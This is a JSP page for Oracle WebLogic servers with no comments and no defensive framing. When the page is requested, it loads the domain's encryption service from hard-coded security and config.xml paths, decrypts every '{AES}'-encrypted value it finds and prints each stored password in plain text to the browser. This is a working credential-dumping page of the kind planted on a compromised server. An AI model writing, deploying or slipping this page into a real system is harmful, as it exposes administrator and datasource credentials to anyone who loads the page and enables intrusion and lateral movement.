<%@ page contentType="text/html; charset=GBK" %>
<%@ page import="java.io.*"%>
<%@ page import="java.util.*"%>
<%@ page import="javax.xml.parsers.*"%>
<%@ page import="org.w3c.dom.*"%>
<%@ page import="javax.xml.xpath.*"%>
<%@ page import="weblogic.security.internal.*"%>
<%@ page import="weblogic.security.internal.encryption.*"%>

<%!
private static final String PREFIX = "{AES}";
private static final String XPATH_EXPRESSION = "//node()[starts-with(text(), '"
			+ PREFIX + "')] | //@*[starts-with(., '" + PREFIX + "')]";
private static ClearOrEncryptedService ces;
private static final String Secruity_path = "/root/Oracle/Middleware/user_projects/domains/base_domain/security";
private static final String Config_path = "/root/Oracle/Middleware/user_projects/domains/base_domain/config/config.xml";


private static String processXml(File file)  {
		String result = "";
		try{
			Document doc = DocumentBuilderFactory.newInstance()
					.newDocumentBuilder().parse(file);
			XPathExpression expr = XPathFactory.newInstance().newXPath()
					.compile(XPATH_EXPRESSION);
			NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
			for (int i = 0; i < nodes.getLength(); i++) {
				Node node = nodes.item(i);
				result = print(node.getNodeName(), node.getTextContent());
			}
		}catch (Exception e) {
				result = "<font color=\"red\">出错了。。</font>";
			
		}
		return result;
 
	}
private static String processProperties(File file) 
{
		String result = "";
		try{
			Properties properties = new Properties();
			properties.load(new FileInputStream(file));
			for (Map.Entry p : properties.entrySet()) {
				if (p.getValue().toString().startsWith(PREFIX)) {
					result = print(p.getKey(), p.getValue());
				}
			}
		
		}catch (Exception e) {
				result = "<font color=\"red\">出错了。。</font>";
			
		}
		
		return result;
}
private static String print(Object attributeName, Object encrypted)
{
		String retStr = "Node name: " + attributeName +"<br>";
		retStr += "Encrypted: " + encrypted + "<br>";
		retStr += "Decrypted: " + ces.decrypt((String) encrypted );
		return retStr;
}

private static String getPassword()
{
	String result = "";
	ces = new ClearOrEncryptedService(
				SerializedSystemIni.getEncryptionService(new File(Secruity_path)
						.getAbsolutePath()));
		File file = new File(Config_path);
		if (file.getName().endsWith(".xml")) {
			result = processXml(file);
		}
 
		else if (file.getName().endsWith(".properties")) {
			result = processProperties(file);
		}
	return result;
}


%>
<%

out.println(getPassword());
%>